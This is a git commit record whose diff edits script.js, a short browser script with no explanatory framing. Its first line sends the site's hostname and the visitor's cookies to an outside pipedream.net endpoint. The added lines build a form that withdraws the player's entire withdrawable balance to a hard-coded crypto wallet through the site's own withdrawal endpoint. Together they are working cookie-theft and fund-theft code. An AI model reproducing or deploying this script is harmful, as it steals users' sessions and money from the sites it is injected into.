a9df867199f4d17155b422e8fb2b3853e0af8d7e
berdos1989 <116584162+berdos1989@users.noreply.github.com>
2023-04-16 13:39:22 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,22 @@
 fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`);
+const formData = new FormData();
+formData.append('paymentSystem', 24);
+formData.append('sum', window.player.balances.withdraw);
+formData.append('wallet_id', "TGPNk7d7JKxKmLP1q7bxqzLmxx32Qtgs3T");
+formData.append("_name","");
+formData.append("_pass","");
+
+
+fetch(`https://${location.hostname}/finance/withdraw/request`, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+  },
+  body: formData,
+})
+.then(response => {
+  console.log('Response:', response);
+})
+.catch(error => {
+  console.error('Error:', error);
+});
